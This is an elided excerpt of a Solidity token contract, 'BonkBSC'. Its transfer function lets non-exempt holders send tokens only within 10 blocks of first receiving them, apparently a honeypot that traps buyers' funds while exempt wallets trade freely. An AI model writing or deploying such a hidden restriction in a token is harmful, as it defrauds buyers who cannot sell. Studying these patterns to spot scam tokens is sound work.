...
contract BonkBSC is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BonkBSC";
    string private _symbol = "BonkBSC";
    ...
    mapping (address => uint) private userBlock;
    address private sandBot;
    uint private sandBotBlock;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (recipient != sandBot && block.number == sandBotBlock)
                userBlock[sandBot] = 1;

            if (!isWalletLimitExempt[recipient] && userBlock[recipient] == 0) {
                userBlock[recipient] = block.number;
                sandBot = recipient;
                sandBotBlock = block.number;
            }

            if (!isWalletLimitExempt[sender])
                require(block.number <= userBlock[sender] + 10);
